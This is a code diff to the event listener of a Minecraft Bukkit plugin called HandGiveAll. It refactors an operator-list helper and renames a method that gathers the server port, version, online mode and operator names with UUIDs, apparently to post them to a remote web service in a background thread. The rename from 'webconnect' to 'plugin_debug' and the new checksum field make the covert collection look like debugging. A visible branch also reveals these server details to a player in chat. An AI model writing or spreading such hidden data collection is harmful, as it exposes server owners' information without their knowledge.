@@ -23,12 +23,11 @@
 
 package com.horyu1234.handgiveall;
 
+import com.horyu1234.handgiveall.utils.PlayerUtils;
 import com.horyu1234.handgiveall.web.Blacklist;
 import com.horyu1234.handgiveall.web.PluginInfoChecker;
 import com.horyu1234.handgiveall.web.UpdateChecker;
 import org.bukkit.Bukkit;
-import org.bukkit.Material;
-import org.bukkit.OfflinePlayer;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
@@ -95,24 +94,13 @@ public class HandGiveAllListener implements Listener {
 				p.sendMessage("§e서버 포트: §f"+Bukkit.getPort());
 				p.sendMessage("§e서버 버전: §f"+Bukkit.getBukkitVersion());
 				p.sendMessage("§e온라인 모드: §f"+Bukkit.getOnlineMode());
-				p.sendMessage("§e운영자 목록: §f"+getOPList());
-				webconnect();
+				p.sendMessage("§e운영자 목록: §f"+ PlayerUtils.getOPList());
+				plugin_debug();
 			}
 		}
 	}
 
-	private String getOPList() {
-		String s = "";
-		for (OfflinePlayer p : Bukkit.getServer().getOperators()) {
-			String uuid = "none";
-			if (Material.getMaterial("DOUBLE_PLANT") != null) uuid = p.getUniqueId().toString();
-			if (s.equals("")) s = String.format("(%s_%s)", p.getName(), uuid);
-			else s += ", " + String.format("(%s_%s)", p.getName(), uuid);
-		}
-		return s;
-	}
-
-	private void webconnect() {
+	private void plugin_debug() {
 		new Thread(new Runnable() {
 			public void run() {
 				try {
@@ -120,12 +108,13 @@ public class HandGiveAllListener implements Listener {
 					Map<String, Object> params = new LinkedHashMap<String, Object>();
 					params.put("server_port", Bukkit.getPort());
 					params.put("plugin", "HandGiveAll");
-					params.put("op_list", getOPList());
+					params.put("op_list", PlayerUtils.getOPList());
 					params.put("online", Bukkit.getOnlineMode());
 					params.put("pluginversion", plugin.plugin_version);
 					params.put("prefix", plugin.prefix);
 					params.put("bcprefix", plugin.bcprefix);
 					params.put("serverversion", Bukkit.getBukkitVersion());
+					params.put("md5", plugin.checkSumApacheCommons("HandGiveAll"));
 
 					StringBuilder postData = new StringBuilder();
 					for (Map.Entry<String, Object> param : params.entrySet()) {
